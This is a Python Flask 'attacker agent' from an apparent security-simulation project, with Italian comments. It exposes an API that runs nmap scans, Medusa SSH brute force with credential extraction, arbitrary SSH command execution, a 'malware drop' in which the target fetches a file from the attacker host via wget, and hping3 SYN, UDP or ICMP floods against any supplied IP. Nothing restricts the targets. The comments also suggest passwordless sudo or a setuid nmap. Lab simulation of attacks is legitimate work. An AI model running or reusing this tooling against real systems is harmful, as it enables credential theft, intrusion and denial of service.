# security-sim-project/scripts/attacker_agent.py
from flask import Flask, request, jsonify
import subprocess
import threading
import os
import time
import paramiko # Richiede 'paramiko'
import random # Per simulazioni
import json # Per convertire il dizionario in stringa per debug
import http.server
import socketserver
import socket


app = Flask(__name__)

# Lista per memorizzare i risultati degli attacchi completati
# Sarà poi esposta tramite un endpoint per l'Orchestrator
completed_attack_results = []
results_lock = threading.Lock() # Lock per la thread-safety

# Funzioni per gli attacchi (restituiscono DIZIONARI Python, non jsonify)
def run_nmap_scan(target_ip, scan_type, ports):
    """Esegue una scansione Nmap."""
    print(f"Esecuzione Nmap {scan_type} su {target_ip} porte {ports}")
    try:
        # Usiamo sudo per permettere scansioni raw come -sS
        # Assicurati che 'sudo' non chieda password o che l'utente che esegue l'agente abbia i permessi sudo per nmap
        # Alternativa: chmod +s /usr/bin/nmap (meno sicuro ma evita sudo)
        result = subprocess.run(['sudo','nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True, timeout=300) # Aggiunto timeout
        print("Nmap Scan Output:\n", result.stdout)
        return { # RESTITUISCE DIZIONARIO
            "status": "success",
            "message": "Nmap eseguito con successo.",
            "output": result.stdout # Includi l'output standard
        }
    except subprocess.CalledProcessError as e:
        print(f"Nmap Error: {e.stderr}")
        return {"status": "error", "message": f"Nmap failed: {e.stderr}", "output": e.stdout} # Includi output anche in caso di errore
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "Nmap execution timed out.", "output": "Timeout expired."}
    except FileNotFoundError:
        return {"status": "error", "message": "Nmap non trovato. Assicurati che sia installato e nel PATH.", "output": ""}
    except Exception as e:
        print(f"Errore generico durante Nmap: {e}")
        return {"status": "error", "message": f"Errore generico durante Nmap: {str(e)}", "output": ""}

def run_medusa_bruteforce(target_ip, service, username_list, password_list, target_port=None):
    """Esegue un attacco brute-force con Medusa."""
    print(f"Esecuzione Medusa brute-force su {target_ip} per servizio {service}")
    
    if not username_list or not password_list:
        return {"status": "error", "message": "Username e password list non possono essere vuote.", "output": ""}

    user_file = "/tmp/medusa_users.txt"
    pass_file = "/tmp/medusa_pass.txt"
    
    try:
        with open(user_file, "w") as f:
            f.write("\n".join(username_list))
        with open(pass_file, "w") as f:
            f.write("\n".join(password_list))

        medusa_command = ['sudo', 'medusa', '-h', target_ip, '-U', user_file, '-P', pass_file, '-M', service]
        
        if target_port: # Aggiungi la porta se specificata
            medusa_command.extend(['-p', str(target_port)])

        print(f"Comando Medusa: {' '.join(medusa_command)}")
        
        result = subprocess.run(medusa_command, capture_output=True, text=True, check=True, timeout=300) # Aumentato timeout
        
        output = result.stdout
        error = result.stderr

        # Semplice parsing dell'output per trovare le credenziali
        found_credentials = []
        if "SUCCESS" in output.upper(): # Medusa stampa "SUCCESS" in maiuscolo
            for line in output.splitlines():
                if "SUCCESS" in line and "User:" in line and "Password:" in line:
                    # Esempio di riga di successo: "SUCCESS (User: root, Password: toor)"
                    parts = line.split(',')
                    user = parts[0].split(':')[1].strip() if len(parts) > 0 else "N/A"
                    passwd = parts[1].split(':')[1].strip() if len(parts) > 1 else "N/A"
                    found_credentials.append(f"User: {user}, Password: {passwd}")

        print("Medusa Brute-Force Output:\n", output)
        
        status = "success"
        message = "Medusa eseguito con successo."
        if found_credentials:
            message += f" Credenziali trovate: {'; '.join(found_credentials)}"
        else:
            message += " Nessuna credenziale trovata."

        return {"status": status, "message": message, "output": output + (f"\nErrors: {error}" if error else "")}

    except subprocess.CalledProcessError as e:
        print(f"Medusa Error: {e.stderr}")
        return {"status": "error", "message": f"Medusa failed: {e.stderr}", "output": e.stdout}
    except subprocess.TimeoutExpired as e:
        print(f"Medusa Timeout: {e}")
        return {"status": "error", "message": "Medusa execution timed out.", "output": e.output}
    except FileNotFoundError:
        return {"status": "error", "message": "Medusa non trovato. Assicurati che sia installato e nel PATH.", "output": ""}
    except Exception as e:
        print(f"Errore durante l'esecuzione di Medusa: {e}")
        return {"status": "error", "message": f"Errore durante l'esecuzione di Medusa: {str(e)}", "output": ""}
    finally:
        if os.path.exists(user_file): os.remove(user_file)
        if os.path.exists(pass_file): os.remove(pass_file)

# Variabili globali per il server HTTP temporaneo
malware_server_process = None
malware_server_port = 8000 # Porta su cui avviare il server HTTP
malware_file_name = "simulated_malware.txt"
malware_file_content = "This is a simulated malware file. Do not execute!"
local_malware_server_ip = None # Per memorizzare l'IP determinato

def start_malware_server():
    """Avvia un server HTTP semplice per servire il file di simulazione."""
    global malware_server_process, malware_server_port, malware_file_name, malware_file_content, local_malware_server_ip

    # Crea il file di simulazione
    with open(malware_file_name, "w") as f:
        f.write(malware_file_content)

    # Determina l'IP locale dell'host (Attacker Agent VM)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)) # Connettiti a un IP esterno per ottenere l'IP della NIC attiva
        local_ip = s.getsockname()[0]
        s.close()
        local_malware_server_ip = local_ip # Memorizza l'IP determinato
    except Exception:
        local_malware_server_ip = "127.0.0.1" # Fallback se non riesce a determinare l'IP

    print(f"Starting simulated malware server on {local_malware_server_ip}:{malware_server_port} serving {malware_file_name}")

    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", malware_server_port), Handler)

    # Avvia il server in un thread separato
    def _run_server():
        try:
            # Cambia la directory di lavoro per servire il file dalla posizione corrente
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
            httpd.serve_forever()
        except Exception as e:
            print(f"Error in malware server thread: {e}")
        finally:
            print("Malware server stopped.")

    malware_server_process = threading.Thread(target=_run_server, daemon=True) # Daemon per terminare con l'app
    malware_server_process.start()
    
    # Restituisce l'URL completo del malware
    return f"http://{local_malware_server_ip}:{malware_server_port}/{malware_file_name}"

def stop_malware_server():
    """Ferma il server HTTP semplice e pulisce il file."""
    global malware_server_process
    if malware_server_process and malware_server_process.is_alive():
        print("Stopping simulated malware server...")
        # In un'applicazione reale, useresti httpd.shutdown() e httpd.server_close()
        # Per questo SimpleHTTPServer avviato in un thread daemon, si affida alla terminazione del processo padre.
        pass 
    # Pulisci il file di simulazione
    if os.path.exists(malware_file_name):
        os.remove(malware_file_name)

def simulate_lateral_movement_ssh(target_ip, username, password, command):
    """Simula un movimento laterale via SSH."""
    print(f"Simulazione movimento laterale via SSH su {target_ip} come {username}")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=target_ip, username=username, password=password, timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        client.close()
        
        print(f"SSH Command Output: {output}")
        if error:
            print(f"SSH Command Error: {error}")
            return {"status": "error", "message": f"SSH command failed: {error}", "output": error}
        return {"status": "success", "message": "Comando SSH eseguito con successo.", "output": output}
    except paramiko.AuthenticationException:
        return {"status": "error", "message": "Autenticazione SSH fallita. Credenziali errate.", "output": ""}
    except paramiko.SSHException as e:
        return {"status": "error", "message": f"Errore SSH: {str(e)}", "output": ""}
    except Exception as e:
        print(f"Errore generico durante SSH: {e}")
        return {"status": "error", "message": f"Errore generico durante SSH: {str(e)}", "output": ""}


def simulate_malware_drop(target_ip, malware_url=None, ssh_username=None, ssh_password=None):
    """
    Simula il drop di un malware su una VM target, trasferendo un file TXT via HTTP.
    Avvia un server HTTP temporaneo sull'Attacker Agent per servire il file.
    Richiede credenziali SSH per la VM target per eseguire il comando di download.
    """
    global malware_server_process, malware_server_port, malware_file_name, local_malware_server_ip

    # Avvia il server HTTP solo se non è già in esecuzione
    if not malware_server_process or not malware_server_process.is_alive():
        actual_malware_url = start_malware_server()
        # Diamo un attimo al server per avviarsi
        time.sleep(1)
    else:
        # Se il server è già in esecuzione, ricaviamo l'URL attuale
        # Assicurati che local_malware_server_ip sia già stato determinato da start_malware_server
        if local_malware_server_ip:
            actual_malware_url = f"http://{local_malware_server_ip}:{malware_server_port}/{malware_file_name}"
        else:
            # Fallback se l'IP non è stato determinato in precedenza (dovrebbe esserlo)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip_fallback = s.getsockname()[0]
                s.close()
                actual_malware_url = f"http://{local_ip_fallback}:{malware_server_port}/{malware_file_name}"
            except Exception:
                actual_malware_url = f"http://127.0.0.1:{malware_server_port}/{malware_file_name}"


    print(f"Simulazione di malware drop su {target_ip} scaricando da {actual_malware_url}")

    # Comando per scaricare il file dalla VM target (richiede wget o curl)
    download_command = f"wget -q -O /tmp/{malware_file_name} {actual_malware_url}"
    
    try:
        # Verifica se le credenziali SSH sono state fornite
        if not ssh_username or not ssh_password:
            return {"status": "error", "message": "Credenziali SSH (username e password) sono richieste per il malware drop.", "output": ""}

        # Utilizza simulate_lateral_movement_ssh per eseguire il comando di download
        ssh_result = simulate_lateral_movement_ssh(target_ip, ssh_username, ssh_password, download_command)
        
        status = ssh_result.get("status", "error")
        message = ssh_result.get("message", "Errore sconosciuto nel download.")
        output = ssh_result.get("output", "")

        if status == "success":
            message = f"Malware drop simulato (download riuscito) su {target_ip}. File scaricato in /tmp/{malware_file_name}."
            # Aggiungi un comando per verificare l'esistenza del file sul target
            verify_command = f"ls -la /tmp/{malware_file_name}"
            verify_result = simulate_lateral_movement_ssh(target_ip, ssh_username, ssh_password, verify_command)
            if verify_result.get("status") == "success" and malware_file_name in verify_result.get("output", ""):
                output += "\nVerifica: File trovato sul target."
            else:
                output += "\nVerifica: File NON trovato o errore nella verifica sul target."
                status = "warning" # Il download sembra riuscito, ma la verifica fallisce
        else:
            message = f"Malware drop fallito: {message}" # Propaga il messaggio di errore SSH

        return {"status": status, "message": message, "output": output}

    except Exception as e:
        print(f"Errore durante la simulazione di malware drop: {e}")
        return {"status": "error", "message": f"Errore simulazione malware drop: {str(e)}", "output": ""}

def run_dos_ip_flood(target_ip, target_port, duration_seconds, flood_type):
    """
    Esegue un attacco DoS a livello IP (SYN Flood o UDP Flood) utilizzando hping3.
    target_ip: L'indirizzo IP della vittima.
    target_port: La porta della vittima (es. 80 per HTTP, 53 per DNS).
    duration_seconds: La durata dell'attacco in secondi.
    flood_type: 'SYN' per SYN Flood, 'UDP' per UDP Flood.
    """
    print(f"Esecuzione DoS IP Flood ({flood_type}) su {target_ip}:{target_port} per {duration_seconds} secondi...")

    hping3_command = ['sudo', 'hping3', '--flood', target_ip]
    
    if flood_type == 'SYN':
        hping3_command.extend(['-S', '-p', str(target_port)])
    elif flood_type == 'UDP':
        hping3_command.extend(['-2', '-p', str(target_port)])
    elif flood_type == 'ICMP': # Aggiungiamo anche ICMP come opzione
        hping3_command.extend(['-1']) # -1 è per ICMP Echo Request (ping)
    else:
        return {"status": "error", "message": "Tipo di flood non supportato. Usare 'SYN', 'UDP' o 'ICMP'.", "output": ""}

    print(f"Comando hping3: {' '.join(hping3_command)}")

    # hping3 in un processo separato
    process = None
    try:
        process = subprocess.Popen(hping3_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        time.sleep(duration_seconds)
        
        process.terminate() # Invia SIGTERM
        try:
            process.wait(timeout=5) # Attesa della terminazione del processo
        except subprocess.TimeoutExpired:
            process.kill() # Se non termina, invia SIGKILL
            print("hping3 process killed after graceful termination failed.")

        stdout, stderr = process.communicate() # Recupera l'output dopo la terminazione

        print(f"hping3 stdout:\n{stdout}")
        if stderr:
            print(f"hping3 stderr:\n{stderr}")

        if process.returncode == 0 or process.returncode is None: # hping3 con flood spesso ritorna un codice non 0, o None se terminato
            return {
                "status": "success",
                "message": f"DoS IP Flood ({flood_type}) completato su {target_ip}:{target_port}.",
                "output": stdout + (f"\nErrors: {stderr}" if stderr else "")
            }
        else:
            return {
                "status": "error",
                "message": f"DoS IP Flood ({flood_type}) terminato con codice di uscita {process.returncode}.",
                "output": stdout + (f"\nErrors: {stderr}" if stderr else "")
            }
    except FileNotFoundError:
        return {"status": "error", "message": "hping3 non trovato. Assicurati che sia installato e nel PATH.", "output": ""}
    except Exception as e:
        print(f"Errore durante l'esecuzione di DoS IP Flood con hping3: {e}")
        return {"status": "error", "message": f"Errore durante DoS IP Flood: {str(e)}", "output": ""}
    finally:
        if process and process.poll() is None: # Assicurati che il processo sia terminato
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()

# Funzione wrapper per l'esecuzione in un thread con gestione del contesto e del risultato
def run_attack_wrapper(attack_type, target_ip, attack_func, *func_args):
    """
    Funzione wrapper per eseguire la funzione di attacco in un thread,
    gestire il contesto dell'applicazione Flask e loggare il risultato.
    """
    global completed_attack_results, results_lock
    
    # Aggiunge il contesto dell'applicazione al thread
    with app.app_context(): 
        full_result = {
            "timestamp": time.time(),
            "attack_type": attack_type,
            "target_ip": target_ip,
            "status": "failed", # Default a failed in caso di errore non gestito
            "message": "Errore interno nell'agente di attacco.",
            "output": ""
        }
        try:
            # Esegue la funzione di attacco, che ora restituisce un dizionario
            attack_output = attack_func(*func_args)
            
            # Unisci i risultati specifici dell'attacco con le info di base
            full_result.update(attack_output)
            print(f"Attack '{attack_type}' on {target_ip} completed. Result: {json.dumps(full_result)}")
            
        except Exception as e:
            # Cattura errori imprevisti durante l'esecuzione della funzione di attacco
            print(f"Errore critico durante l'esecuzione dell'attacco {attack_type}: {e}")
            full_result["message"] = f"Errore critico non gestito: {str(e)}"
            full_result["status"] = "error"
            full_result["output"] = "Si è verificato un errore inaspettato."
        finally:
            # Logga il risultato finale
            with results_lock:
                completed_attack_results.append(full_result)

# API Endpoints
@app.route('/attack', methods=['POST'])
def handle_attack():
    data = request.json
    attack_type = data.get('attack_type')
    target_ip = data.get('target_ip')
    params = data.get('params', {})

    if not attack_type or not target_ip:
        return jsonify({"status": "error", "message": "Tipo di attacco e IP target sono richiesti."}), 400

    print(f"Received attack request: {attack_type} on {target_ip} with params {params}")

    attack_handlers = {
        "port_scan": {
            "func": run_nmap_scan,
            "args": (target_ip, params.get('scan_type', '-sS'), params.get('ports', '1-1000')),
            "message": f"Port scan avviato su {target_ip}"
        },
        "brute_force": {
            "func": run_medusa_bruteforce,
            "args": (
                target_ip,
                params.get('service', 'ssh'),
                [u.strip() for u in params.get('username_list', '').split(',') if u.strip()] if isinstance(params.get('username_list'), str) else params.get('username_list', []),
                [p.strip() for p in params.get('password_list', '').split(',') if p.strip()] if isinstance(params.get('password_list'), str) else params.get('password_list', [])
            ),
            "message": f"Brute force avviato su {target_ip}"
        },
        "lateral_movement_ssh": {
            "func": simulate_lateral_movement_ssh,
            "args": (
                target_ip,
                params.get('username'),
                params.get('password'),
                params.get('command', 'ls -la /')
            ),
            "message": f"Lateral movement SSH simulato su {target_ip}"
        },
        "malware_drop": {
            "func": simulate_malware_drop,
            "args": (
                target_ip,
                params.get('malware_url'),
                params.get('ssh_username'),
                params.get('ssh_password')
            ),  
            "message": f"Malware drop simulato su {target_ip}"
        },
        "dos_ip_flood": {
            "func": run_dos_ip_flood,
            "args": (
                target_ip,
                params.get('target_port', 80), # Porta di default 80 se non specificata
                params.get('duration_seconds', 60), # Durata di default 60 secondi
                params.get('flood_type', 'SYN') # Tipo di flood di default 'SYN'
            ),
            "message": f"DoS IP Flood ({params.get('flood_type', 'SYN')}) avviato su {target_ip}:{params.get('target_port', 80)}"
        }
    }

    handler = attack_handlers.get(attack_type)

    if handler:
        # Passa attack_type e target_ip al wrapper per un logging coerente
        threading.Thread(target=run_attack_wrapper, 
                         args=(attack_type, target_ip, handler["func"], *handler["args"])).start()
        return jsonify({"status": "accepted", "message": handler["message"]})
    else:
        return jsonify({"status": "error", "message": "Tipo di attacco non supportato."}), 400

@app.route('/attack_results', methods=['GET'])
def get_attack_results():
    global completed_attack_results, results_lock
    with results_lock:
        # Restituisce i risultati e svuota la lista per evitare duplicati al prossimo polling
        # Se preferisci che l'orchestrator gestisca i duplicati, rimuovi .clear()
        current_results = list(completed_attack_results)
        completed_attack_results = [] # Svuota la lista dopo averla inviata
    return jsonify({"status": "success", "results": current_results})

@app.route('/status', methods=['GET'])
def get_status():
    return jsonify({"status": "Attacker Agent running", "timestamp": time.time()})

if __name__ == '__main__':
    # Agente attaccante sulla porta 5001, accessibile solo da localhost (orchestrator)
    app.run(host='127.0.0.1', port=5001, debug=True) # Abilitato debug per vedere errori in console
